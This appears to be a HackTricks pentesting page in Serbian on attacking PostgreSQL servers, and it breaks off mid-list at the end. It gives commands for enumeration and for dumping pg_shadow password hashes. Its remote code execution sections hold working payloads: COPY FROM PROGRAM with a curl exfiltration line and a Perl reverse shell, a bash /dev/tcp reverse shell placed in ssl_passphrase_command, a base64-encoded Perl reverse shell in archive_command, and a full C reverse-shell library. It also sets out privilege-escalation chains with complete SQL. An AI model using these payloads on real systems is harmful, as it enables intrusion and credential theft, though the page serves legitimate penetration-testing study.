# 5432,5433 - Pentesting Postgresql

<figure><img src="../images/image (48).png" alt=""><figcaption></figcaption></figure>

\
Koristite [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=pentesting-postgresql) za lako kreiranje i **automatizaciju radnih tokova** pokretanih najnaprednijim **alatima** zajednice.\
Pribavite pristup danas:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=pentesting-postgresql" %}

{{#include ../banners/hacktricks-training.md}}

## **Osnovne informacije**

**PostgreSQL** se opisuje kao **objektno-relaциони sistem baza podataka** koji je **otvorenog koda**. Ovaj sistem ne samo da koristi SQL jezik, već ga i unapređuje dodatnim funkcijama. Njegove mogućnosti omogućavaju mu da upravlja širokim spektrom tipova podataka i operacija, što ga čini svestranim izborom za programere i organizacije.

**Podrazumevani port:** 5432, a ako je ovaj port već u upotrebi, čini se da će postgresql koristiti sledeći port (verovatno 5433) koji nije u upotrebi.
```
PORT     STATE SERVICE
5432/tcp open  pgsql
```
## Povezivanje i Osnovno Enum
```bash
psql -U <myuser> # Open psql console with user
psql -h <host> -U <username> -d <database> # Remote connection
psql -h <host> -p <port> -U <username> -W <password> <database> # Remote connection
```

```sql
psql -h localhost -d <database_name> -U <User> #Password will be prompted
\list # List databases
\c <database> # use the database
\d # List tables
\du+ # Get users roles

# Get current user
SELECT user;

# Get current database
SELECT current_catalog;

# List schemas
SELECT schema_name,schema_owner FROM information_schema.schemata;
\dn+

#List databases
SELECT datname FROM pg_database;

#Read credentials (usernames + pwd hash)
SELECT usename, passwd from pg_shadow;

# Get languages
SELECT lanname,lanacl FROM pg_language;

# Show installed extensions
SHOW rds.extensions;
SELECT * FROM pg_extension;

# Get history of commands executed
\s
```
> [!WARNING]
> Ako prilikom pokretanja **`\list`** pronađete bazu podataka pod nazivom **`rdsadmin`**, znate da ste unutar **AWS postgresql baze podataka**.

Za više informacija o **kako zloupotrebiti PostgreSQL bazu podataka** proverite:

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/
{{#endref}}

## Automatska Enumeracija
```
msf> use auxiliary/scanner/postgres/postgres_version
msf> use auxiliary/scanner/postgres/postgres_dbname_flag_injection
```
### [**Brute force**](../generic-hacking/brute-force.md#postgresql)

### **Skeniranje portova**

Prema [**ovoj studiji**](https://www.exploit-db.com/papers/13084), kada pokušaj povezivanja ne uspe, `dblink` baca `sqlclient_unable_to_establish_sqlconnection` izuzetak koji uključuje objašnjenje greške. Primeri ovih detalja su navedeni u nastavku.
```sql
SELECT * FROM dblink_connect('host=1.2.3.4
port=5678
user=name
password=secret
dbname=abc
connect_timeout=10');
```
- Host je nedostupan

`DETAIL: nije moguće povezati se na server: Nema rute do hosta Da li server radi na hostu "1.2.3.4" i prihvata TCP/IP veze na portu 5678?`

- Port je zatvoren
```
DETAIL:  could not connect to server: Connection refused Is  the  server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
- Port je otvoren
```
DETAIL:  server closed the connection unexpectedly This  probably  means
the server terminated abnormally before or while processing the request
```
или
```
DETAIL:  FATAL:  password authentication failed for user "name"
```
- Port je otvoren ili filtriran
```
DETAIL:  could not connect to server: Connection timed out Is the server
running on host "1.2.3.4" and accepting TCP/IP connections on port 5678?
```
U PL/pgSQL funkcijama trenutno nije moguće dobiti detalje o izuzecima. Međutim, ako imate direktan pristup PostgreSQL serveru, možete dobiti potrebne informacije. Ako vađenje korisničkih imena i lozinki iz sistemskih tabela nije izvodljivo, možete razmotriti korišćenje metode napada rečnikom koja je razmatrana u prethodnom odeljku, jer bi mogla potencijalno dati pozitivne rezultate.

## Enumeracija privilegija

### Uloge

| Tipovi uloga   |                                                                                                                                                      |
| -------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| rolsuper       | Uloga ima superkorisničke privilegije                                                                                                              |
| rolinherit     | Uloga automatski nasleđuje privilegije uloga čiji je član                                                                                          |
| rolcreaterole  | Uloga može kreirati više uloga                                                                                                                     |
| rolcreatedb    | Uloga može kreirati baze podataka                                                                                                                  |
| rolcanlogin    | Uloga može da se prijavi. To jest, ova uloga može biti data kao identifikator za autorizaciju početne sesije                                     |
| rolreplication | Uloga je replikacijska uloga. Replikacijska uloga može inicirati replikacione veze i kreirati i brisati replikacione slotove.                    |
| rolconnlimit   | Za uloge koje mogu da se prijave, ovo postavlja maksimalan broj istovremenih veza koje ova uloga može napraviti. -1 znači bez ograničenja.       |
| rolpassword    | Nije lozinka (uvek se prikazuje kao `********`)                                                                                                     |
| rolvaliduntil  | Vreme isteka lozinke (koristi se samo za autentifikaciju lozinkom); null ako nema isteka                                                           |
| rolbypassrls   | Uloga zaobilazi svaku politiku bezbednosti na nivou reda, vidi [Odeljak 5.8](https://www.postgresql.org/docs/current/ddl-rowsecurity.html) za više informacija. |
| rolconfig      | Podrazumevane vrednosti specifične za ulogu za promenljive konfiguracije u vreme izvršavanja                                                       |
| oid            | ID uloge                                                                                                                                           |

#### Zanimljive grupe

- Ako ste član **`pg_execute_server_program`** možete **izvršavati** programe
- Ako ste član **`pg_read_server_files`** možete **čitati** fajlove
- Ako ste član **`pg_write_server_files`** možete **pisati** fajlove

> [!NOTE]
> Imajte na umu da u Postgres-u **korisnik**, **grupa** i **uloga** predstavljaju **isto**. To zavisi od **načina na koji ga koristite** i da li **dozvoljavate prijavu**.
```sql
# Get users roles
\du

#Get users roles & groups
# r.rolpassword
# r.rolconfig,
SELECT
r.rolname,
r.rolsuper,
r.rolinherit,
r.rolcreaterole,
r.rolcreatedb,
r.rolcanlogin,
r.rolbypassrls,
r.rolconnlimit,
r.rolvaliduntil,
r.oid,
ARRAY(SELECT b.rolname
FROM pg_catalog.pg_auth_members m
JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
WHERE m.member = r.oid) as memberof
, r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;

# Check if current user is superiser
## If response is "on" then true, if "off" then false
SELECT current_setting('is_superuser');

# Try to grant access to groups
## For doing this you need to be admin on the role, superadmin or have CREATEROLE role (see next section)
GRANT pg_execute_server_program TO "username";
GRANT pg_read_server_files TO "username";
GRANT pg_write_server_files TO "username";
## You will probably get this error:
## Cannot GRANT on the "pg_write_server_files" role without being a member of the role.

# Create new role (user) as member of a role (group)
CREATE ROLE u LOGIN PASSWORD 'lriohfugwebfdwrr' IN GROUP pg_read_server_files;
## Common error
## Cannot GRANT on the "pg_read_server_files" role without being a member of the role.
```
### Tabele
```sql
# Get owners of tables
select schemaname,tablename,tableowner from pg_tables;
## Get tables where user is owner
select schemaname,tablename,tableowner from pg_tables WHERE tableowner = 'postgres';

# Get your permissions over tables
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants;

#Check users privileges over a table (pg_shadow on this example)
## If nothing, you don't have any permission
SELECT grantee,table_schema,table_name,privilege_type FROM information_schema.role_table_grants WHERE table_name='pg_shadow';
```
### Funkcije
```sql
# Interesting functions are inside pg_catalog
\df * #Get all
\df *pg_ls* #Get by substring
\df+ pg_read_binary_file #Check who has access

# Get all functions of a schema
\df pg_catalog.*

# Get all functions of a schema (pg_catalog in this case)
SELECT routines.routine_name, parameters.data_type, parameters.ordinal_position
FROM information_schema.routines
LEFT JOIN information_schema.parameters ON routines.specific_name=parameters.specific_name
WHERE routines.specific_schema='pg_catalog'
ORDER BY routines.routine_name, parameters.ordinal_position;

# Another aparent option
SELECT * FROM pg_proc;
```
## Akcije na fajl sistemu

### Čitanje direktorijuma i fajlova

Iz ovog [**commit** ](https://github.com/postgres/postgres/commit/0fdc8495bff02684142a44ab3bc5b18a8ca1863a) članovi definisane **`DEFAULT_ROLE_READ_SERVER_FILES`** grupe (nazvane **`pg_read_server_files`**) i **super korisnici** mogu koristiti **`COPY`** metodu na bilo kojoj putanji (pogledajte `convert_and_check_filename` u `genfile.c`):
```sql
# Read file
CREATE TABLE demo(t text);
COPY demo from '/etc/passwd';
SELECT * FROM demo;
```
> [!WARNING]
> Zapamtite da ako niste super korisnik, ali imate **CREATEROLE** dozvole, možete **postati član te grupe:**
>
> ```sql
> GRANT pg_read_server_files TO username;
> ```
>
> [**Više informacija.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Postoje **druge postgres funkcije** koje se mogu koristiti za **čitati datoteku ili listati direktorijum**. Samo **superkorisnici** i **korisnici sa eksplicitnim dozvolama** mogu ih koristiti:
```sql
# Before executing these function go to the postgres DB (not in the template1)
\c postgres
## If you don't do this, you might get "permission denied" error even if you have permission

select * from pg_ls_dir('/tmp');
select * from pg_read_file('/etc/passwd', 0, 1000000);
select * from pg_read_binary_file('/etc/passwd');

# Check who has permissions
\df+ pg_ls_dir
\df+ pg_read_file
\df+ pg_read_binary_file

# Try to grant permissions
GRANT EXECUTE ON function pg_catalog.pg_ls_dir(text) TO username;
# By default you can only access files in the datadirectory
SHOW data_directory;
# But if you are a member of the group pg_read_server_files
# You can access any file, anywhere
GRANT pg_read_server_files TO username;
# Check CREATEROLE privilege escalation
```
Možete pronaći **više funkcija** u [https://www.postgresql.org/docs/current/functions-admin.html](https://www.postgresql.org/docs/current/functions-admin.html)

### Jednostavno Pisanje Fajlova

Samo **super korisnici** i članovi **`pg_write_server_files`** mogu koristiti copy za pisanje fajlova.
```sql
copy (select convert_from(decode('<ENCODED_PAYLOAD>','base64'),'utf-8')) to '/just/a/path.exec';
```
> [!WARNING]
> Zapamtite da ako niste super korisnik, ali imate **`CREATEROLE`** dozvole, možete **postati član te grupe:**
>
> ```sql
> GRANT pg_write_server_files TO username;
> ```
>
> [**Više informacija.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Zapamtite da COPY ne može obraditi znakove novog reda, stoga čak i ako koristite base64 payload, **morate poslati jedan red**.\
Veoma važna ograničenja ove tehnike su da **`copy` ne može biti korišćen za pisanje binarnih fajlova jer menja neke binarne vrednosti.**

### **Upload binarnih fajlova**

Međutim, postoje **druge tehnike za upload velikih binarnih fajlova:**

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.md
{{#endref}}

## <img src="../images/i3.png" alt="" data-size="original">

**Bug bounty savet**: **prijavite se** za **Intigriti**, premium **bug bounty platformu koju su kreirali hakeri, za hakere**! Pridružite nam se na [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) danas, i počnite da zarađujete nagrade do **$100,000**!

{% embed url="https://go.intigriti.com/hacktricks" %}

### Ažuriranje PostgreSQL podataka tabele putem lokalnog pisanja fajlova

Ako imate potrebne dozvole za čitanje i pisanje PostgreSQL server fajlova, možete ažurirati bilo koju tabelu na serveru **prepisivanjem povezanog fajl nod-a** u [PostgreSQL direktorijumu podataka](https://www.postgresql.org/docs/8.1/storage.html). **Više o ovoj tehnici** [**ovde**](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users).

Potrebni koraci:

1.  Nabavite PostgreSQL direktorijum podataka

```sql
SELECT setting FROM pg_settings WHERE name = 'data_directory';
```

**Napomena:** Ako ne možete da dobijete trenutnu putanju direktorijuma podataka iz podešavanja, možete upititi glavnu verziju PostgreSQL-a putem `SELECT version()` upita i pokušati da brute-force putanju. Uobičajene putanje direktorijuma podataka na Unix instalacijama PostgreSQL-a su `/var/lib/PostgreSQL/MAJOR_VERSION/CLUSTER_NAME/`. Uobičajeno ime klastera je `main`.

2.  Nabavite relativnu putanju do filenode-a, povezanog sa ciljanom tabelom

```sql
SELECT pg_relation_filepath('{TABLE_NAME}')
```

Ovaj upit bi trebao da vrati nešto poput `base/3/1337`. Puna putanja na disku će biti `$DATA_DIRECTORY/base/3/1337`, tj. `/var/lib/postgresql/13/main/base/3/1337`.

3.  Preuzmite filenode putem `lo_*` funkcija

```sql
SELECT lo_import('{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}',13337)
```

4.  Dobijte tip podataka, povezan sa ciljanom tabelom

```sql
SELECT
STRING_AGG(
CONCAT_WS(
',',
attname,
typname,
attlen,
attalign
),
';'
)
FROM pg_attribute
JOIN pg_type
ON pg_attribute.atttypid = pg_type.oid
JOIN pg_class
ON pg_attribute.attrelid = pg_class.oid
WHERE pg_class.relname = '{TABLE_NAME}';
```

5.  Koristite [PostgreSQL Filenode Editor](https://github.com/adeadfed/postgresql-filenode-editor) da [izmenite filenode](https://adeadfed.com/posts/updating-postgresql-data-without-update/#updating-custom-table-users); postavite sve `rol*` boolean zastavice na 1 za pune dozvole.

```bash
python3 postgresql_filenode_editor.py -f {FILENODE} --datatype-csv {DATATYPE_CSV_FROM_STEP_4} -m update -p 0 -i ITEM_ID --csv-data {CSV_DATA}
```

![PostgreSQL Filenode Editor Demo](https://raw.githubusercontent.com/adeadfed/postgresql-filenode-editor/main/demo/demo_datatype.gif)

6.  Ponovo upload-ujte izmenjeni filenode putem `lo_*` funkcija, i prepišite originalni fajl na disku

```sql
SELECT lo_from_bytea(13338,decode('{BASE64_ENCODED_EDITED_FILENODE}','base64'))
SELECT lo_export(13338,'{PSQL_DATA_DIRECTORY}/{RELATION_FILEPATH}')
```

7.  _(Opcionalno)_ Očistite keš tabele u memoriji pokretanjem skupog SQL upita

```sql
SELECT lo_from_bytea(133337, (SELECT REPEAT('a', 128*1024*1024))::bytea)
```

8.  Sada biste trebali videti ažurirane vrednosti tabele u PostgreSQL-u.

Takođe možete postati superadmin izmenom `pg_authid` tabele. **Pogledajte** [**sledeći odeljak**](pentesting-postgresql.md#privesc-by-overwriting-internal-postgresql-tables).

## RCE

### **RCE do programa**

Od[ verzije 9.3](https://www.postgresql.org/docs/9.3/release-9-3.html), samo **super korisnici** i članovi grupe **`pg_execute_server_program`** mogu koristiti copy za RCE (primer sa eksfiltracijom:
```sql
'; copy (SELECT '') to program 'curl http://YOUR-SERVER?f=`ls -l|base64`'-- -
```
Primer za izvršavanje:
```bash
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;

#Reverse shell
#Notice that in order to scape a single quote you need to put 2 single quotes
COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
```
> [!WARNING]
> Zapamtite da ako niste super korisnik, ali imate **`CREATEROLE`** dozvole, možete **postati član te grupe:**
>
> ```sql
> GRANT pg_execute_server_program TO username;
> ```
>
> [**Više informacija.**](pentesting-postgresql.md#privilege-escalation-with-createrole)

Ili koristite `multi/postgres/postgres_copy_from_program_cmd_exec` modul iz **metasploit**.\
Više informacija o ovoj ranjivosti [**ovde**](https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5). Dok je prijavljena kao CVE-2019-9193, Postges je izjavio da je to [karakteristika i da neće biti ispravljena](https://www.postgresql.org/about/news/cve-2019-9193-not-a-security-vulnerability-1935/).

### RCE sa PostgreSQL jezicima

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md
{{#endref}}

### RCE sa PostgreSQL ekstenzijama

Kada ste **naučili** iz prethodnog posta **kako da otpremite binarne datoteke**, možete pokušati da dobijete **RCE otpremanjem PostgreSQL ekstenzije i učitavanjem iste**.

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.md
{{#endref}}

### RCE sa konfiguracionim fajlom PostgreSQL-a

> [!NOTE]
> Sledeći RCE vektori su posebno korisni u ograničenim SQLi kontekstima, jer se svi koraci mogu izvesti kroz ugnježdene SELECT izjave

**Konfiguracioni fajl** PostgreSQL-a je **pisan** od strane **postgres korisnika**, koji pokreće bazu podataka, tako da kao **superkorisnik**, možete pisati datoteke u datotečnom sistemu, i stoga možete **prepisati ovu datoteku.**

![](<../images/image (322).png>)

#### **RCE sa ssl_passphrase_command**

Više informacija [o ovoj tehnici ovde](https://pulsesecurity.co.nz/articles/postgres-sqli).

Konfiguracioni fajl ima neke zanimljive atribute koji mogu dovesti do RCE:

- `ssl_key_file = '/etc/ssl/private/ssl-cert-snakeoil.key'` Putanja do privatnog ključa baze podataka
- `ssl_passphrase_command = ''` Ako je privatna datoteka zaštićena lozinkom (kriptovana), PostgreSQL će **izvršiti komandu navedenu u ovom atributu**.
- `ssl_passphrase_command_supports_reload = off` **Ako** je ovaj atribut **uključen**, **komanda** koja se izvršava ako je ključ zaštićen lozinkom **biće izvršena** kada se izvrši `pg_reload_conf()`.

Tada će napadač morati da:

1. **Izvrši dump privatnog ključa** sa servera
2. **Enkriptuje** preuzeti privatni ključ:
1. `rsa -aes256 -in downloaded-ssl-cert-snakeoil.key -out ssl-cert-snakeoil.key`
3. **Prepiše**
4. **Izvrši dump** trenutne PostgreSQL **konfiguracije**
5. **Prepiše** **konfiguraciju** sa pomenutim atributima:
1. `ssl_passphrase_command = 'bash -c "bash -i >& /dev/tcp/127.0.0.1/8111 0>&1"'`
2. `ssl_passphrase_command_supports_reload = on`
6. Izvrši `pg_reload_conf()`

Dok sam testirao ovo, primetio sam da će ovo raditi samo ako **privatna datoteka ključa ima privilegije 640**, da je **u vlasništvu root-a** i da je u **grupi ssl-cert ili postgres** (tako da korisnik postgres može da je pročita), i da se nalazi u _/var/lib/postgresql/12/main_.

#### **RCE sa archive_command**

**Više** [**informacija o ovoj konfiguraciji i o WAL ovde**](https://medium.com/dont-code-me-on-that/postgres-sql-injection-to-rce-with-archive-command-c8ce955cf3d3)**.**

Još jedan atribut u konfiguracionom fajlu koji se može iskoristiti je `archive_command`.

Da bi ovo radilo, podešavanje `archive_mode` mora biti `'on'` ili `'always'`. Ako je to tačno, onda bismo mogli prepisati komandu u `archive_command` i naterati je da se izvrši putem WAL (write-ahead logging) operacija.

Opšti koraci su:

1. Proverite da li je archive mode uključen: `SELECT current_setting('archive_mode')`
2. Prepišite `archive_command` sa payload-om. Na primer, obrnuta ljuska: `archive_command = 'echo "dXNlIFNvY2tldDskaT0iMTAuMC4wLjEiOyRwPTQyNDI7c29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpO2lmKGNvbm5lY3QoUyxzb2NrYWRkcl9pbigkcCxpbmV0X2F0b24oJGkpKSkpe29wZW4oU1RESU4sIj4mUyIpO29wZW4oU1RET1VULCI+JlMiKTtvcGVuKFNUREVSUiwiPiZTIik7ZXhlYygiL2Jpbi9zaCAtaSIpO307" | base64 --decode | perl'`
3. Ponovo učitajte konfiguraciju: `SELECT pg_reload_conf()`
4. Naterajte WAL operaciju da se izvrši, što će pozvati archive command: `SELECT pg_switch_wal()` ili `SELECT pg_switch_xlog()` za neke verzije Postgres-a

#### **RCE sa preload bibliotekama**

Više informacija [o ovoj tehnici ovde](https://adeadfed.com/posts/postgresql-select-only-rce/).

Ovaj napad koristi sledeće konfiguracione varijable:

- `session_preload_libraries` -- biblioteke koje će biti učitane od strane PostgreSQL servera prilikom povezivanja klijenta.
- `dynamic_library_path` -- lista direktorijuma u kojima će PostgreSQL server tražiti biblioteke.

Možemo postaviti vrednost `dynamic_library_path` na direktorijum, koji je pisan od strane `postgres` korisnika koji pokreće bazu podataka, npr. `/tmp/` direktorijum, i otpremiti zlonameran `.so` objekat tamo. Zatim ćemo naterati PostgreSQL server da učita naš novoučitani biblioteku uključivanjem u varijablu `session_preload_libraries`.

Koraci napada su:

1. Preuzmite originalni `postgresql.conf`
2. Uključite `/tmp/` direktorijum u vrednost `dynamic_library_path`, npr. `dynamic_library_path = '/tmp:$libdir'`
3. Uključite ime zlonamerne biblioteke u vrednost `session_preload_libraries`, npr. `session_preload_libraries = 'payload.so'`
4. Proverite glavnu verziju PostgreSQL-a putem `SELECT version()` upita
5. Kompajlirajte zlonamerni kod biblioteke sa odgovarajućim PostgreSQL dev paketom. Primer koda:

```c
#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "postgres.h"
#include "fmgr.h"

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif

void _init() {
/*
kod preuzet sa https://www.revshells.com/
*/

int port = REVSHELL_PORT;
struct sockaddr_in revsockaddr;

int sockt = socket(AF_INET, SOCK_STREAM, 0);
revsockaddr.sin_family = AF_INET;
revsockaddr.sin_port = htons(port);
revsockaddr.sin_addr.s_addr = inet_addr("REVSHELL_IP");

connect(sockt, (struct sockaddr *) &revsockaddr,
sizeof(revsockaddr));
dup2(sockt, 0);
dup2(sockt, 1);
dup2(sockt, 2);

char * const argv[] = {"/bin/bash", NULL};
execve("/bin/bash", argv, NULL);
}
```

Kompajliranje koda:

```bash
gcc -I$(pg_config --includedir-server) -shared -fPIC -nostartfiles -o payload.so payload.c
```

6. Otpremite zlonamerni `postgresql.conf`, kreiran u koracima 2-3, i prepišite originalni
7. Otpremite `payload.so` iz koraka 5 u `/tmp` direktorijum
8. Ponovo učitajte konfiguraciju servera ponovnim pokretanjem servera ili pozivanjem `SELECT pg_reload_conf()` upita
9. Prilikom sledeće DB konekcije, dobićete obrnutu ljusku.

## **Postgres Privesc**

### CREATEROLE Privesc

#### **Grant**

Prema [**dokumentaciji**](https://www.postgresql.org/docs/13/sql-grant.html): _Uloge koje imaju **`CREATEROLE`** privilegiju mogu **dodeliti ili oduzeti članstvo u bilo kojoj ulozi** koja **nije** superkorisnik._

Dakle, ako imate **`CREATEROLE`** dozvolu, mogli biste sebi dodeliti pristup drugim **ulogama** (koje nisu superkorisnici) koje vam mogu dati mogućnost da čitate i pišete datoteke i izvršavate komande:
```sql
# Access to execute commands
GRANT pg_execute_server_program TO username;
# Access to read files
GRANT pg_read_server_files TO username;
# Access to write files
GRANT pg_write_server_files TO username;
```
#### Izmena lozinke

Korisnici sa ovom ulogom takođe mogu **promeniti** **lozinke** drugih **ne-superkorisnika**:
```sql
#Change password
ALTER USER user_name WITH PASSWORD 'new_password';
```
#### Privesc to SUPERUSER

Prilično je uobičajeno da **lokalni korisnici mogu da se prijave u PostgreSQL bez davanja bilo kakve lozinke**. Stoga, kada prikupite **dozvole za izvršavanje koda**, možete zloupotrebiti te dozvole da dobijete **`SUPERUSER`** ulogu:
```sql
COPY (select '') to PROGRAM 'psql -U <super_user> -c "ALTER USER <your_username> WITH SUPERUSER;"';
```
> [!NOTE]
> Ovo je obično moguće zbog sledećih linija u **`pg_hba.conf`** datoteci:
>
> ```bash
> # "local" je samo za Unix domen socket veze
> local   all             all                                     trust
> # IPv4 lokalne veze:
> host    all             all             127.0.0.1/32            trust
> # IPv6 lokalne veze:
> host    all             all             ::1/128                 trust
> ```

### **ALTER TABLE privesc**

U [**ovoj analizi**](https://www.wiz.io/blog/the-cloud-has-an-isolation-problem-postgresql-vulnerabilities) objašnjeno je kako je bilo moguće **privesc** u Postgres GCP zloupotrebom ALTER TABLE privilegije koja je dodeljena korisniku.

Kada pokušate da **napravite drugog korisnika vlasnikom tabele**, trebali biste dobiti **grešku** koja to sprečava, ali očigledno je GCP dao tu **opciju ne-superkorisniku postgres** u GCP:

<figure><img src="../images/image (537).png" alt=""><figcaption></figcaption></figure>

Spajajući ovu ideju sa činjenicom da kada se **INSERT/UPDATE/**[**ANALYZE**](https://www.postgresql.org/docs/13/sql-analyze.html) komande izvršavaju na **tabeli sa funkcijom indeksa**, **funkcija** se **poziva** kao deo komande sa **dozvolama** **vlasnika tabele**. Moguće je kreirati indeks sa funkcijom i dati dozvole vlasnika **super korisniku** nad tom tabelom, a zatim izvršiti ANALYZE nad tabelom sa zlonamernom funkcijom koja će moći da izvršava komande jer koristi privilegije vlasnika.
```c
GetUserIdAndSecContext(&save_userid, &save_sec_context);
SetUserIdAndSecContext(onerel->rd_rel->relowner,
save_sec_context | SECURITY_RESTRICTED_OPERATION);
```
#### Eksploatacija

1. Počnite kreiranjem nove tabele.
2. Umetnite neki nebitan sadržaj u tabelu kako biste obezbedili podatke za funkciju indeksa.
3. Razvijte zlonamernu funkciju indeksa koja sadrži payload za izvršenje koda, omogućavajući izvršavanje neovlašćenih komandi.
4. PROMENITE vlasnika tabele na "cloudsqladmin," što je superuser u GCP-u koji se isključivo koristi za upravljanje i održavanje baze podataka.
5. Izvršite ANALYZE operaciju na tabeli. Ova akcija primorava PostgreSQL engine da pređe u korisnički kontekst vlasnika tabele, "cloudsqladmin." Kao rezultat, zlonamerna funkcija indeksa se poziva sa dozvolama "cloudsqladmin," čime se omogućava izvršenje prethodno neovlašćene shell komande.

U PostgreSQL-u, ovaj tok izgleda ovako:
```sql
CREATE TABLE temp_table (data text);
CREATE TABLE shell_commands_results (data text);

INSERT INTO temp_table VALUES ('dummy content');

/* PostgreSQL does not allow creating a VOLATILE index function, so first we create IMMUTABLE index function */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql IMMUTABLE AS 'select ''nothing'';';

CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
Tada će tabela `shell_commands_results` sadržati izlaz izvršenog koda:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### Lokalna prijava

Neki pogrešno konfigurisani postgresql instance mogu omogućiti prijavu bilo kog lokalnog korisnika, moguće je lokalno sa 127.0.0.1 koristeći **`dblink` funkciju**:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
> [!WARNING]
> Imajte na umu da da bi prethodna upit funkcionisao **funkcija `dblink` mora postojati**. Ako ne postoji, možete pokušati da je kreirate sa
>
> ```sql
> CREATE EXTENSION dblink;
> ```

Ako imate lozinku korisnika sa većim privilegijama, ali korisnik nije dozvoljen da se prijavi sa spoljnog IP-a, možete koristiti sledeću funkciju da izvršite upite kao taj korisnik:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
Moguće je proveriti da li ova funkcija postoji sa:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **Prilagođena definisana funkcija sa** SECURITY DEFINER

[**U ovom izveštaju**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), pentesteri su mogli da privesc unutar postgres instance koju je obezbedio IBM, jer su **pronašli ovu funkciju sa SECURITY DEFINER oznakom**:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
…
</code></pre>

Kao što je [**objašnjeno u dokumentaciji**](https://www.postgresql.org/docs/current/sql-createfunction.html), funkcija sa **SECURITY DEFINER se izvršava** sa privilegijama **korisnika koji je poseduje**. Stoga, ako je funkcija **ranjiva na SQL Injection** ili vrši neke **privilegovane radnje sa parametrima koje kontroliše napadač**, može se zloupotrebiti za **eskalaciju privilegija unutar postgres-a**.

U liniji 4 prethodnog koda možete videti da funkcija ima **SECURITY DEFINER** oznaku.
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
I zatim **izvršite komande**:

<figure><img src="../images/image (649).png" alt=""><figcaption></figcaption></figure>

### Pass Burteforce sa PL/pgSQL

**PL/pgSQL** je **potpuno funkcionalni programski jezik** koji nudi veću proceduralnu kontrolu u poređenju sa SQL-om. Omogućava korišćenje **petlji** i drugih **kontrolnih struktura** za poboljšanje logike programa. Pored toga, **SQL izjave** i **okidači** imaju sposobnost da pozivaju funkcije koje su kreirane koristeći **PL/pgSQL jezik**. Ova integracija omogućava sveobuhvatan i svestran pristup programiranju i automatizaciji baza podataka.\
**Možete zloupotrebiti ovaj jezik kako biste tražili od PostgreSQL-a da brute-force-uje korisničke akreditive.**

{{#ref}}
../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md
{{#endref}}

### Privesc prepisivanjem internih PostgreSQL tabela

> [!NOTE]
> Sledeći privesc vektor je posebno koristan u ograničenim SQLi kontekstima, jer se svi koraci mogu izvesti kroz ugnježdene SELECT izjave

Ako možete **čitati i pisati PostgreSQL server fajlove**, možete **postati superkorisnik** prepisivanjem PostgreSQL on-disk filenode-a, povezanog sa internom `pg_authid` tabelom.

Pročitajte više o **ovoj tehnici** [**ovde**](https://adeadfed.com/posts/updating-postgresql-data-without-update/)**.**

Koraci napada su:

1. Nabavite PostgreSQL direktorijum podataka
